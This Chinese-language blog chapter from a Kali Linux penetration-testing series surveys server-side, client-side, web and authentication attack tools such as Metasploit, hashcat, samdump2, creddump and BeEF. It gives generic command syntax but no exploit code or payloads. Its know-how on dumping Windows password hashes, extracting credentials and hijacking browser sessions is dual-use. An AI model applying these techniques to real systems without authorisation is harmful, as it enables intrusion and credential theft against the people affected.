<!DOCTYPE HTML>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
    <!--Setting-->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta http-equiv="Cache-Control" content="no-siteapp">
    <meta http-equiv="Cache-Control" content="no-transform">
    <meta name="renderer" content="webkit|ie-comp|ie-stand">
    <meta name="apple-mobile-web-app-capable" content="来唧唧歪歪(Ljjyy.com) - 多读书多实践，勤思考善领悟">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="format-detection" content="telephone=no,email=no,adress=no">
    <meta name="browsermode" content="application">
    <meta name="screen-orientation" content="portrait">
    <meta name="theme-version" content="1.2.3">
    <meta name="root" content="/">
    <link rel="dns-prefetch" href="https://www.ljjyy.com">
    <!--SEO-->

    <meta name="keywords" content="linux,kali">


    <meta name="description" content="一. 服务器端攻击漏洞评估服务器端攻击即找出并利用服务器上的服务、端口和应用程序中的漏洞。举个例子，Web服务器都有多个攻击途径（Attack Vector）。它会运行一个操作系统，并运行各种各...">



<meta name="robots" content="all">
<meta name="google" content="all">
<meta name="googlebot" content="all">
<meta name="verify" content="all">

    <!--Title-->


<title>Kali linux渗透测试之 五.渗透攻击 | 来唧唧歪歪(Ljjyy.com) - 多读书多实践，勤思考善领悟</title>


    <link rel="alternate" href="/atom.xml" title="来唧唧歪歪(Ljjyy.com) - 多读书多实践，勤思考善领悟" type="application/atom+xml">


    <link rel="icon" href="/favicon.ico">

    



<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7">
<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.5.0">
<link rel="stylesheet" href="/css/style.css?rev=@@hash">




    
	<div class="hide">
        <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
        <script>LA.init({id: "JgbNOaw1xxsmUUsQ",ck: "JgbNOaw1xxsmUUsQ"})</script>
	</div>






    
    <meta name="baidu-site-verification" content="dTHILoORpx">


    <script>
        (function(){
            var bp = document.createElement('script');
            var curProtocol = window.location.protocol.split(':')[0];
            if (curProtocol === 'https') {
                bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
            }
            else {
                bp.src = 'http://push.zhanzhang.baidu.com/push.js';
            }
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(bp, s);
        })();
    </script>

</head>

</html>
<!--[if lte IE 8]>
<style>
    html{ font-size: 1em }
</style>
<![endif]-->
<!--[if lte IE 9]>
<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
<![endif]-->

<body>
    <header class="main-header"  >
    <div class="main-header-box">
        <!--a class="header-avatar" href="/" title='Ljjyy.com'>
            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
        </a-->
        <div class="branding">
            
                <h2> 多读书多实践，勤思考善领悟 </h2>
            
    	  </div>
    </div>
</header>
    <nav class="main-navigation">
    <div class="container">

        <div class="row">
            <div class="col-sm-12">
                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
                    <span class="sr-only"></span>
                        <i class="fa fa-bars"></i>
                    </span>
                    <a class="web-logo"  href="/" title='Ljjyy.com'></a>
                    <!--a class="navbar-brand" href="https://www.ljjyy.com">来唧唧歪歪(Ljjyy.com) - 多读书多实践，勤思考善领悟</a-->
                </div>
                <div class="collapse navbar-collapse" id="main-menu" style="">
                    <ul class="menu">
                        
                            <li role="presentation" class="text-center">
                                <a href="/"><i class="fa "></i>首页</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/cloud/"><i class="fa "></i>云计算</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/front/"><i class="fa "></i>前端</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/back/"><i class="fa "></i>后端</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/devops/"><i class="fa "></i>运维</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/crack/"><i class="fa "></i>破解</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/penetration/"><i class="fa "></i>渗透</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/tool/"><i class="fa "></i>工具</a>
                            </li>
                        
                            <li role="presentation" class="text-center">
                                <a href="/categories/other/"><i class="fa "></i>其他</a>
                            </li>
                        
                    </ul>
                </div>
            </div>
        </div>
    </div>
</nav>
    <section class="content-wrap">
        <div class="container">
            <div class="row">
                <main class="col-md-8 main-content m-post">
                    <p id="process"></p>
<article class="post">
    <div class="post-head">
        <h1 id="Kali linux渗透测试之 五.渗透攻击">
            
	            Kali linux渗透测试之 五.渗透攻击
            
        </h1>
        <div class="post-meta">
    
        <span class="categories-meta fa-wrap">
            <i class="fa fa-folder-open-o"></i>
            <a class="category-link" href="/categories/penetration/">渗透</a>
        </span>
    

    
        <span class="fa-wrap">
            <i class="fa fa-tags"></i>
            <span class="tags-meta">
                
                    <a class="tag-link" href="/tags/kali/">kali</a> <a class="tag-link" href="/tags/linux/">linux</a>
                
            </span>
        </span>
    

    
        
        <span class="fa-wrap">
            <i class="fa fa-clock-o"></i>
            <span class="date-meta">2019/01/10</span>
        </span>
        
    
</div>
            
            
            <p class="fa fa-exclamation-triangle warning">
                本文于<strong>1621</strong>天之前发表，文中内容可能已经过时。
            </p>
        
    </div>
    
    <div class="post-body post-content">
        <h1 id="一-服务器端攻击"><a href="#一-服务器端攻击" class="headerlink" title="一. 服务器端攻击"></a>一. 服务器端攻击</h1><h2 id="漏洞评估"><a href="#漏洞评估" class="headerlink" title="漏洞评估"></a>漏洞评估</h2><p>服务器端攻击即找出并利用服务器上的服务、端口和应用程序中的漏洞。举个例子，Web服务器都有多个攻击途径（Attack Vector）。它会运行一个操作系统，并运行各种各样的软件来提供Web功能。它会有很多打开的TCP端口。这些途径中的每一个都有可能找出一个攻击者能利用的漏洞，攻击者可以借此潜入系统并获取有用的信息。服务器上的许多协议都是人类可读的为加密文本处理的。</p>
<p>在Kali中也带了较多用来找出服务器端漏洞的工具：</p>
<h2 id="（1）Skipfish"><a href="#（1）Skipfish" class="headerlink" title="（1）Skipfish"></a>（1）Skipfish</h2><p>Skipfish是一款Web应用安全侦查工具。Skipfish会利用递归爬虫和基于字典的探针生成一副交互式网站地图。最终生成的地图会在通过安全检查后输出。</p>
<p><img src="/img/posts/20180406181936417.png" alt="img"></p>
<p>有些字典可能在kali中找不到，你可以从<a href="https://code.google.com/p/skipfish下载。" target="_blank" rel="noopener">https://code.google.com/p/skipfish下载。</a></p>
<p>如果要对某个目标网站使用定制字典，可以先输入Skipfish，然后用-w选项后跟字典文件的位置路径来选择字典，在其后再使用-o后跟位置路径来指定输出目录，最后是目标网站：</p>
<p>Skipfish -o  &lt;输出位置&gt; -w &lt;字典文件的位置&gt; （目标网站）</p>
<h2 id="（2）ProxyStrike"><a href="#（2）ProxyStrike" class="headerlink" title="（2）ProxyStrike"></a>（2）ProxyStrike</h2><p>Proxystrike是一个Web应用代理，用来浏览应用时找出漏洞。它的运行机制跟代理类似，默认监听端口是8008端口，也就是说，你要对浏览器进行设置，使其运行时经过ProxyStrike。这样它才能在你的浏览目标网站时在后台分析所有参数。代理功能非常适合用来识别、拦截和修改请求的内容。</p>
<p><img src="/img/posts/20180406183048577.png" alt="img"></p>
<p>proxyStrik的爬虫功能用来扫描目标网站的SQL或SSL以及XSS的插件漏洞非常方便。你不要将ProxyStrike设置为代理就能使用爬虫功能。要在某个网站上和XSS插件一起运行爬虫功能，你可以点击“<strong>Plugins</strong>”标签，之后滚动到XSS插件，再勾选框中选中并启用该插件。然后，选中<strong>Crawler</strong>标签，输入http://目的网站URL，使用插件框来检查爬虫，然后点击它上面大大的Stop按钮，使其状态变为Running即可。添加这些插件会增加扫描需要的时间。Proxystrik会显示一个状态栏，在哪里会显示出扫描还要持续的时间。</p>
<p><img src="/img/posts/20180406183818660.png" alt="img"></p>
<p><img src="/img/posts/20180406183807113.png" alt="img"></p>
<h2 id="（3）Vega"><a href="#（3）Vega" class="headerlink" title="（3）Vega"></a>（3）Vega</h2><p>在Kali 2018（kali 2.0）系列中vega已经不存在了，需要自己动手安装</p>
<p><img src="/img/posts/20180406184241810.png" alt="img"></p>
<p>vega是一个安全测试工具，用来爬取一个网站，并分析页面内容来找到链接和表单参数。</p>
<p>如果要运行vega直接在终端输入vega即可：</p>
<p><img src="/img/posts/20180406184402568.png" alt="img"></p>
<p>在vega的右上角有一个Scanner和Proxy标签。要将Vega用作扫描器，点击右上角的Scanner标签，然后点左右脚的Scann开始新的扫描</p>
<p><img src="/img/posts/20180406184552796.png" alt="img"></p>
<p>之后会有对话框弹出，要求输入目标URL即可：</p>
<p><img src="/img/posts/20180406184704987.png" alt="img"></p>
<p>之后的扫描选择设置根据自己的目的进行设置即可！</p>
<h2 id="（4）OWASP-ZAP"><a href="#（4）OWASP-ZAP" class="headerlink" title="（4）OWASP ZAP"></a>（4）OWASP ZAP</h2><p>OWASP ZAP也称为Zaproxy，是一个专门为Web应用的安全测试而设计的拦截代理。</p>
<p>你可以在终端输入“owasp-zap”来启动：</p>
<p><img src="/img/posts/20180406185228311.png" alt="img"></p>
<p>注：在这页面正式进入之前会有一个弹框，询问是否“创建一个SSL根CA证书。”这样Zaproxy就可以拦截浏览器总通过SSL传送的HTTPS数据。</p>
<p>对测试使用HTTPS的应用来说，这非常重要。要生成SSL证书，点击Generate按钮即可！</p>
<p>由于篇幅问题，所以在这里就不对OWASP-ZAP进行详细的介绍了，有机会我会在我的博客中的工具部分进行讲解其具体的使用方法。</p>
<h2 id="（5）WebSploit"><a href="#（5）WebSploit" class="headerlink" title="（5）WebSploit"></a>（5）WebSploit</h2><p>WebSploit是一个用来扫描和分析远程系统以找到漏洞的开源项目,在Kali 2018中需要自己安装</p>
<p><img src="/img/posts/20180406190806413.png" alt="img"></p>
<p>要开启websploit只需要在终端输入“websploit”即可：</p>
<p><img src="/img/posts/20180406190916427.png" alt="img"></p>
<p>你可以使用show modules来查看有哪些可以使用的模块：</p>
<p><img src="/img/posts/2018040619101779.png" alt="img"></p>
<p>如果要使用只需要在前面加上“use”即可，其使用方法与Metasploit很是相似。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>如果渗透测试人员在目标侦查阶段投入了足够的时间和资源，他很有可能就已经列出了有可能有漏洞的哪些目标。下一步就是评估每一个目标对你的任务的价值，并进行排序。可以评估对潜在漏洞的进行利用需要投入的精力，结合执行攻击时的连带风险一起考虑。Kali中自带的漏洞和漏洞利用工具非常适合对Web应用服务器进行侦查时找出和利用漏洞。</p>
<p><strong>（1）Metasploit</strong></p>
<p>Metasploit框架是进行服务器端攻击时一种最流行的功能工具，它也被认为是对渗透测试人员最有利的工具之一。介绍Metasploit的使用的部分在我的Metasploit系列学习中有详细的介绍，我在此处就不再过多的讲解了。</p>
<p><strong>（2）W3af</strong></p>
<p>w3af是Web Application Attack and Audit Framework（Web应用攻击和安全审计框架）的缩写。它是一个开源的Web应用安全扫描器和漏洞利用工具。</p>
<p><strong>w3af在Kali2018中没有带，需要自己安装，安装方法请参考：</strong></p>
<p><strong><a href="https://jingyan.baidu.com/article/c1a3101e710d84de656deb86.html" target="_blank" rel="noopener">https://jingyan.baidu.com/article/c1a3101e710d84de656deb86.html</a></strong></p>
<p><strong>对于W3af的使用请参考本博主的工具系列文章！</strong></p>
<h2 id="利用电子邮件系统的漏洞"><a href="#利用电子邮件系统的漏洞" class="headerlink" title="利用电子邮件系统的漏洞"></a>利用电子邮件系统的漏洞</h2><p>从本质上来说，所有的电子邮件系统都要接入互联网，接收来自外部的匿名访问，这样才能起作用。许多企业用户都会通过电子邮件发送机密信息。在大多数环境中，电子邮件服务器都会报存一些有价值的信息，这使得他们成为了攻击者的最高优先级目标。对使用者来说，好消息是只要正确配置了，现代电子邮件系统是极其难被抓住漏洞的。但这并不意味着电子邮件系统对攻击者来就是免疫的。大多数邮件系统都有Web应用，并可以通过Web界面访问。这提高了远程攻击者获取核心系统访问权限的可能性，攻击者可以利用它作为跳板，连接到内网的其他系统。</p>
<p>在我们将邮件系统作为目标之前，首先需要知道托管邮件服务器是什么系统。如果不知道这些信息，可以通过fierce来找出MX主机。在大多数情况下，MX主机就是SMTP服务器。</p>
<h2 id="暴力破解攻击"><a href="#暴力破解攻击" class="headerlink" title="暴力破解攻击"></a>暴力破解攻击</h2><p>暴力破解攻击是指对加密数据尝试所有可能的密文，知道找到正确的密文。从资源和时间占用角度来看，暴力破解攻击的成本极高。攻击者通常是看中了密文的长度限制和密文的简单性来对加密中的漏洞加以利用。如果密文通常是基于字典中的单词，那么这意味着攻击者需要测试的全部空间就是对应的词典中的所有单词，这使得猜测的范围远小于采用随机字符的单词。避免暴力破解攻击的最好方法就是使用很长的复杂密文，外加尝试多次后采用超时阻止等其他方法来提高安全因子。</p>
<p>常见的暴力破解攻击的工具有：</p>
<ul>
<li>Hydra（密码破解）</li>
<li>DirBuster（目录枚举）</li>
<li>WebSlayer（表单、post\GET参数）</li>
</ul>
<h2 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h2><p>密码是用户在系统上认证身份最常用的方法。在对目标系统进行漏洞利用时，通常也能找出能够访问其他系统的密码。常见的密码破解工具有如下：</p>
<ul>
<li>John the Ripper</li>
</ul>
<h2 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h2><p>在标准定义中，中间人攻击（MITM，Man-In-The-Middle）是指攻击者跟受害者分别建立独立链接的一种侵入式攻击方式。中间人攻击最常出现在主机系统之间。</p>
<p><strong>SSL Strip</strong></p>
<p>2009年，安全研究人员Moxie Marlinspike在DefCon上发布了SSL strip工具。他介绍了SSL会话劫持的基本概念，这是一种中间人攻击的形式。其中网络攻击者代理的是来自用户的HTTPs请求，而非可以被拦截和篡改的通过HTTP发送的请求。SSL Strip可以将这种攻击自动化，允许第三方拦截到安全站点的数据连接。随后，人们制定了HTTP严格传送协议（HSTS，HTTP strict Transport Security Speification)来应对这类攻击。但HSTS的部署进程非常慢。时至今日，SSL会话劫持攻击仍然广为使用。</p>
<p>这一部分关于SSL中间人攻击的内容自己可以在网络上找到好多的相关资料，我就不在这里啰嗦了！</p>
<h1 id="二-客户端攻击"><a href="#二-客户端攻击" class="headerlink" title="二. 客户端攻击"></a>二. 客户端攻击</h1><h2 id="客户端攻击"><a href="#客户端攻击" class="headerlink" title="客户端攻击"></a>客户端攻击</h2><p>客户端（client）或主机（host）是指用来上网的终端设备，比如计算机、平板电脑或是移动设备。客户端可能会为其他客户端提供信息、服务及应用，或是从其他系统（比如服务器）获取信息。通常，属于客户端是指供人们使用的终端设备。然而，人的参与可能会引发一些了的漏洞。因此，客户端攻击这种方法就应运而生。由于它跟Web应用具有关联性，所以可以用来找出谁链接到了Web应用，系统上有哪些漏洞，以及这些系统是否可以成为从Web应用获取访问权限或信息的一种途径。</p>
<p>下面先会介绍如何通过社会工程来攻击主机。然后详细阐述如何在主机系统上找到漏洞，这样你就可以使用其他方法对漏洞进行利用了。</p>
<h2 id="社会工程"><a href="#社会工程" class="headerlink" title="社会工程"></a>社会工程</h2><p>社会工程师欺骗人们使其泄露信息的艺术。许多客户端攻击者都是据此来欺骗终端用户，使他们的系统暴露给攻击者。社会工程设计的范围很广，从拨打电话声称自己是某公司正式员工到在人人网上发个声称是某类服务的链接而实际上是欺骗客户的一种手段都是。</p>
<p>如果想要保障社会工程攻击能够成功，那么最佳的方式就是花时间充分的熟悉你的目标，也就是要学习用户是如何交流的，并尝试融入他们的环境。许多未能成功的社会工程学攻击都是因为采用通用的格式，而内容中没有能够吸引被攻击者用户的强有力的抓手，比如一些写的很糟糕的电邮总是声称获得了无人认领的奖金。</p>
<p><strong>社会工程学攻击工具</strong></p>
<p>这里我们就暂时不展开进行讲解了，到了后期我们会有一个专门关于社会工程学的讲解，到时候一定全面讲解。</p>
<h2 id="获取和破解用户密码"><a href="#获取和破解用户密码" class="headerlink" title="获取和破解用户密码"></a>获取和破解用户密码</h2><p>根据定义，密码破解是指从计算机系统中存储或传送的数据中还原密码。密码是用来加固各类型系统的安全的。</p>
<p>获取密码最简单的方式就是通过社会工程学。</p>
<p>黑客破解密码的方式有：</p>
<ul>
<li>猜测：通常使用收集到的与目标有关的信息进行人工猜测</li>
<li>字典攻击：使用自动化攻击，利用字典中所有可能的单词进行尝试</li>
<li>暴力破解：使用所有可能的字符组合来破解</li>
<li>混合模式：混合使用字典攻击和暴力破解</li>
</ul>
<h2 id="Kali中的密码破解工具"><a href="#Kali中的密码破解工具" class="headerlink" title="Kali中的密码破解工具"></a>Kali中的密码破解工具</h2><p>Kali提供了各种各样的工具来绕过密码安全。密码破解工具可以在密码攻击模块中找到，具体可以分为离线破解工具和在线破解工具本节将介绍在web应用渗透测试中危害主机系统的安全工具。</p>
<p><strong>（1）Johnny</strong></p>
<p>Johnny是流行的John the Ripper密码破解工具的一个图形化界面。同时Johnny也有命令行界面，Johnny有若干个引擎，这样他就可以破解不同类型的密码，包括加密过的密码和散列化处理过的密码。Johnny能够自动检测大多数散裂化的密码和加密过的密码，这点是的这个过程对渗透测试人员来说更简单。攻击者都喜欢这个工具，因为它的可定制性非常强，能以各种方式定制，以便于加快破解密码的速度。</p>
<p><strong>John the Ripper按如下方式来工作：</strong></p>
<ul>
<li>尝试用攻击字典来破解密码；</li>
<li>尝试在字典单词的前面或后面添加上数字字符来破解</li>
<li>将字典单词放在一起进行攻击</li>
<li>将字母数字字符放到一起组成新的单词</li>
<li>在字典单词中混入特殊字符来进行攻击</li>
<li>当所有的ITA方法都失败了，尝试暴力破解</li>
</ul>
<p><img src="/img/posts/20180407120030444.png" alt="img"></p>
<p><strong>Option：</strong>选择攻击的类型</p>
<p><strong>Statistics：</strong>显示某一个会话活动的时间</p>
<p><strong>Setting：</strong>指定Johnny以何种方式运行</p>
<p><strong>（2）hashcat和oclHashcat</strong></p>
<p>hashcat 和oclHashcat是密码破解工具。oclHashcat是基于GPGPU的版本。hash/oclHashcat工具大多都是多线程工具。他们可以在单个攻击会话中并行处理多个散列和密码列表。hash/oclHashcat工具提供了多个攻击选项，比如暴力破解、密码合成、字典、混合、掩码和基于规则的攻击。</p>
<p>你可以在终端输入hashcat -h 来打开hashcat并查看其使用说明：</p>
<p><img src="/img/posts/20180407120917425.png" alt="img"></p>
<p>如果你要对一个文档进行hashcat，你可以输入：</p>
<p>hashcat [选项] 散列文件名 [单词文件|目录]</p>
<p><strong>（3）samdump2</strong></p>
<p>samdump2是一个用来转存微软的Windows中密码散列的SAM文件的工具，这样密码就可以用离线工具进行破解。对于较新版本的Windows，你可能需要借助其他工具来抓取SYSKEY（启动密文）文件，进而访问存在SAM数据库中的散列。</p>
<p><img src="/img/posts/20180407121544304.png" alt="img"></p>
<p><strong>（4）chntpw</strong></p>
<p>chntpw是Kali linux、BackTrack和其他linux发行版本中带有的一个工具。可以用它来重置Windows 8或早期的Windows版本中的本地密码，也可以修改Windows的密码数据库。不过，主要是用于在不知道密码的情况下入侵Windows系统。</p>
<p><img src="/img/posts/20180407122241451.png" alt="img"></p>
<p>使用说明如上所示</p>
<p><strong>（5）Ophcrack</strong></p>
<p>Ophcrack是一个机遇彩虹表的Windows密码破解器。Kali提供了一个命令行版本和一个图形化版本界面。Ophcrack可以从多种格式中导入散列，包括直接从Windows的SAM文件中直接转存。下面的截图显示的是可以直接加载到Ophcrack中的几种格式：</p>
<p><img src="/img/posts/20180407122641775.png" alt="img"></p>
<p>Ophcarack自带了彩虹表，如下面的例子所示。我们建议加载最新的彩虹表而不是默认的。彩虹表可以从在线资源中下载，比如开发者网站：<a href="http://ophcrack.sourceforge.net/tables.php" target="_blank" rel="noopener">http://ophcrack.sourceforge.net/tables.php</a></p>
<p><strong>（6）Crunch</strong></p>
<p>Crunch是一个用来生成密码列表的工具。如果你能够收集到有关目标如何创建密码的情报信息，那么这个工具会非常有用。举个例子，如果你抓去了两个密码并观察到目标都市用一个短语后跟随数字来作为密码，南无Crunch可以用来快速生成那个短语后跟所有可能的随机数字的密码列表。</p>
<p><img src="/img/posts/20180407123219193.png" alt="img"></p>
<p><strong>Curnch有一些特殊标记字符，可以翻译成如下：</strong></p>
<ul>
<li>@ ：插入小写字符</li>
<li>%：插入数字</li>
<li>，：插入大写字符</li>
<li>^ ：插入符号</li>
</ul>
<p>举个列子，假定我们已经知道目标在密码中用pass后跟两个不确定的字符。为了针对六位字符密码运行Crunch，我们会首先让pass后跟两位不确定的数字。可以用%%来代替任意数字。运行这个命令，并将输出放到一个名为newpasswordlist.txt的文本文件中，可用如下实例输入：</p>
<p><img src="/img/posts/20180407123813235.png" alt="img"></p>
<p>最后的字典内容为：</p>
<p><img src="/img/posts/20180407123848312.png" alt="img"></p>
<p>同理我们也可以根据以上的匹配规则来生成不同的字典序列。</p>
<h2 id="Kali中的其他可用工具"><a href="#Kali中的其他可用工具" class="headerlink" title="Kali中的其他可用工具"></a>Kali中的其他可用工具</h2><p>Kali中也有其他有用的工具，我们只接受其中能够帮助危害主机系统、获取Web应用服务器的访问权限的工具。Kali中海油一些其他密码破解工具没有加到这个列表中；不过对这些工具的介绍不会在这里展开。</p>
<p><strong>（1）Hash-idenifier</strong></p>
<p>Hash-identifier（散列识别工具）是一个用来识别散列类型的基于python的工具。大多数密码破解工具如John the Ripper都自带了一个散列类型自动检测函数，这类函数都非常好用，在90%的情况下都是精确的。而这个工具可以用来手动验证某个散列类型。要使用Hash-identifier，可以运行这个工具，并粘贴你要识别的散列。</p>
<p><img src="/img/posts/20180407124823213.png" alt="img"></p>
<p><strong>（2）findmyhash</strong></p>
<p>findmyhash是一个免费的在线服务来破解密码的python脚本工具。在使用此工具时，你必须要先连接到Internet，之后你就可以根据题提供的使用说明进行破解密文了：</p>
<p><img src="/img/posts/2018040712535621.png" alt="img"></p>
<p><strong>（3）CmosPwd</strong></p>
<p>CmosPwd是用来破解BIOS的密码的。Cmospwd允许你擦除/清理、备份和恢复CMOS。</p>
<p><img src="/img/posts/20180407125610154.png" alt="img"></p>
<p><strong>(4)creddump</strong></p>
<p>creddump是一个python工具，用来从Windows的注册表中提取各种凭据和密码，creddump可以提取LM和NT散列（SYSKEY保护的）、缓存的域密码或LSA密码。</p>
<h1 id="三-Web攻击"><a href="#三-Web攻击" class="headerlink" title="三. Web攻击"></a>三. Web攻击</h1><p>公司的安全管理员一般度知道因特网上有一些恶意群体，他们会持续不断的寻找对网络进行渗透的方式。作为防御，管理员要采取一些安全措施，常见的包括防火墙、IPS/IDS、基于主机的安全产品（如：反病毒程序）、内容过滤器等。过去，这些防御方式还足够用，不过现今威胁已经变的越来越复杂，甚至能绕过商业安全产品或“COTS”安全解决方案。本小节介绍的工具将会包含Kali LInux中的方法，用于绕过位于远程位置的标准安全防御措施。</p>
<h2 id="浏览器漏洞利用框架：BeEF"><a href="#浏览器漏洞利用框架：BeEF" class="headerlink" title="浏览器漏洞利用框架：BeEF"></a>浏览器漏洞利用框架：BeEF</h2><p>浏览器漏洞可能会被各种恶意软件利用，篡改浏览器的预期行为。这些漏洞都是常见的攻击路径，因为大多数主机系统都会用到某种形式的Web浏览器应用。让我们一起看看一个用于利用浏览器漏洞的流行工具。</p>
<p>Beef是一个基于浏览器的漏洞利用包，它会“勾住”一个或多个浏览器作为发起攻击的滩头堡。攻击者可以通过让用户访问一个定制的URL来勾住用户，用户看到的依然是典型的web页面，而攻击者已经访问了用户的会话Beef绕过了网络安全部署和基于主机系统的反病毒程序，它瞄准的是常见的浏览器中找到的漏洞，比如IE和Firefox浏览器。</p>
<p><strong>默认用户名与密码都是beef</strong></p>
<p><img src="/img/posts/20180407131517959.png" alt="img"></p>
<p>至于Beef的使用我们在这里就不再展开说明了，有兴趣的话可以自己多找找相关使用说明。</p>
<p>总之，防御基于浏览器的渗透工具非常困难。最好的防御是保证所有基于浏览器的软件都被更新到了最新版本，打了安全补丁，并禁用了浏览器中的Flash和java。此外，能够检测常见的基于应用的威胁的安全解决方案可以多提供一层安全加固，如下一代入侵防御系统（NGIPS）.如Beef等渗透工具的大多数受害者都是点击了伪装成可信团体的邮件或社交媒体访客中的链接的用户，而实际上这些链接都是用恶意链接、软件或代码等包装过的。</p>
<h2 id="FoxyProxy（fireFox插件）"><a href="#FoxyProxy（fireFox插件）" class="headerlink" title="FoxyProxy（fireFox插件）"></a>FoxyProxy（fireFox插件）</h2><p>FoxyProxy是一款FierFox扩展，它允许你轻松的管理、修改、启用或禁用Firefox上的代理设置。你可以存Fierfox扩展库中下载FoxyProxy。</p>
<h2 id="Burp代理"><a href="#Burp代理" class="headerlink" title="Burp代理"></a>Burp代理</h2><p>Burp代理是一款拦截HTTP和HTTPS浏览的工具，它允许渗透测试人员检查某一个应用、它的漏洞以及客户端和Web服务器之间的双向数据流。Burp代理非常流行，因为它不止能用来检查数据流，还可以用来篡改数据。</p>
<p>至于这一块内容我就不再多数了，这个是老生常谈的内容了，如果有什么疑问可以去我的博客中找相关的信息，里面有非常详细的介绍。</p>
<p><img src="/img/posts/20180407133332199.png" alt="img"></p>
<h2 id="OWASP-ZAP"><a href="#OWASP-ZAP" class="headerlink" title="OWASP ZAP"></a>OWASP ZAP</h2><p>这一个工具我们也不再过多的重复了，之前的内容中就已经提及过了，如果有不清楚的可以看看本节之前的内容，这里提出来知识想让大家明白这个工具的用途较为广泛，可以在web中大展身手。</p>
<h2 id="Set"><a href="#Set" class="headerlink" title="Set"></a>Set</h2><p>同理，Set我们在此处也不多说了，之后会在社会工程学那一块详细的介绍。</p>
<h2 id="Fimap"><a href="#Fimap" class="headerlink" title="Fimap"></a>Fimap</h2><p>Fimap是一款python工具，用于自动查找、准备、审计、利用和用谷歌搜索Web应用中的<strong>本地和远程文件包含Bug</strong></p>
<p><img src="/img/posts/20180407133758333.png" alt="img"></p>
<p>fimap中有一些插件，你可以通过以下命令来安装：</p>
<p>fimap –install-plugins</p>
<p>要使用Fimap，首先你需要通过指定URL来确定你的目标，指定URL时他会有多种选项，你可以指定一个URL，或是用谷歌来获取一系列的URL，或是从其他URL中提取URL等方法。他如何处理表单和首部也会有多种选项。</p>
<h2 id="拒绝服务工具（DDOS）"><a href="#拒绝服务工具（DDOS）" class="headerlink" title="拒绝服务工具（DDOS）"></a><strong>拒绝服务工具（DDOS）</strong></h2><p>这部分内容较多，我们在此处不展开介绍，之后我会对这个系列设置一个分类，专门进行讲解词内容。</p>
<h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><p>Kali linux还提供了其他许多基于Web的攻击有用的工具，这里介绍一些在之前没有介绍到的工具</p>
<p><strong>(1)DNSChef</strong></p>
<p>DNSChef是一款为渗透测试人员和恶意软件分析人员准备的DNS代理。DNS代理也被称作“伪造DNS”，是一款用于应用网络流量分析以及其他场景的工具。</p>
<p>DNS是正对计算机、服务、或任何连接到英特网或私有网的资源的分布式命名系统。通过提供伪造DNS地址，我们可以将流量重定向到其他需要的位置。</p>
<p><img src="/img/posts/20180407135043110.png" alt="img"></p>
<p><strong>（2）Siege</strong></p>
<p>Siege是一款为Web开发人员设计的HTTP/HTTPS压力测试工具，用来测量高压情况下他们代码的性能。Siege提供了多线程HTTP负载测试和基准测试功能，他会根据可配置的兵法和模范用户的数据来对Web服务器进行测试。Siege有回归、英特网仿真和暴力等工作方式。</p>
<p><img src="/img/posts/20180407135448355.png" alt="img"></p>
<p>具体的使用方程参考以上说明即可。</p>
<h1 id="四-数据库攻击"><a href="#四-数据库攻击" class="headerlink" title="四. 数据库攻击"></a>四. 数据库攻击</h1><p>这一块内容参见<a href="100154.html#三-诊断数据库漏洞">Kali linux渗透测试之 四.漏洞映射 诊断数据库漏洞</a></p>
<h1 id="五-身份认证攻击"><a href="#五-身份认证攻击" class="headerlink" title="五. 身份认证攻击"></a>五. 身份认证攻击</h1><h2 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h2><p>身份认证是确认信任某人的身份。它的含义可能会包含确认某个人、某个应用或是某个硬件的身份，比如验证Alex是政府的雇员，以及他的笔记本电脑是由政府机构颁发的。作为渗透测试人员，通过已授予的实体获得系统的信任、绕过安全认证部分非常有用。</p>
<p>CISSP将身份认证按三个因子归类如下：</p>
<ul>
<li>你知道的，比如PIN或密码</li>
<li>你拥有的,比如智能卡</li>
<li>你是谁，比如指纹</li>
</ul>
<p>最常用的确认身份的方式是通过人们知道的内容，比如密码。之前已经对各种密码的破解方法进行了详细的介绍。你能够通过破解密码获得一系列的访问权限，不过许多系统都是用了多个因子的身份认证，也就是说证明某人身份时需要多个认证步骤。</p>
<h2 id="攻击会话管理"><a href="#攻击会话管理" class="headerlink" title="攻击会话管理"></a>攻击会话管理</h2><p>身份认证和会话管理涵盖了处理用户身份认证和管理活动的方方面面。对Web应用来说，会话就是用户在某个网站上花费的时间。最佳实践是基于用户和设备是如何通过身份认证的来管理已通过身份认证的会话（也就是，允许你访问哪些内容），同时也要控制会话活动期间哪些资源可以用，可以用多久等。这使得身份认证成为管理授权会话的关键过程。</p>
